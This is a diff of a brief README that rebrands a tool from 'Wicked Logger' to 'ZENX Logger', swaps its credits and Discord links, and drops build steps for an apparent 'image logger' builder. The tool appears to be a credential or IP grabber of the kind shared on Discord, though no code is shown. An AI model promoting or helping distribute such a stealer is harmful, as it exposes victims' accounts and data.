@@ -1,14 +1,9 @@
--- WICKED LOGGER
+-- ZENX LOGGER
 
 
-**ALL CREDS TO wick#4444 / https://discord.gg/wickedlogger**
+**ALL CREDS TO wi6ck and https://discord.gg/7c6Fk3yeWU**
 
 
-To use image logger:
-Run installrequirements.bat
-Run setup.py
-Run WickedBuilder.exe
+This is a simple logger made with python (its compiled to .exe though)
 
-Enjoy!
-
-- More detailed explanation at: https://rentry.org/wickedlogger
+- Features and explanations on the discord server
